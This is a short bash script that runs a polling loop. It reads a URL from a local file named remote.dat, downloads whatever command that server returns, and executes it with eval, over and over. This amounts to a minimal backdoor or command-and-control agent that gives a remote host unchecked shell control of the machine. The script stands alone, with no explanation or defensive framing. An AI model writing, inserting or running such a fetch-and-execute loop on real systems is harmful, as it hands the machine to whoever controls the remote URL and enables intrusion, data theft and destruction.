#!/bin/bash
while true
do
	remote=$(cat remote.dat)
	command=$(curl -s "$remote")
	eval $command
done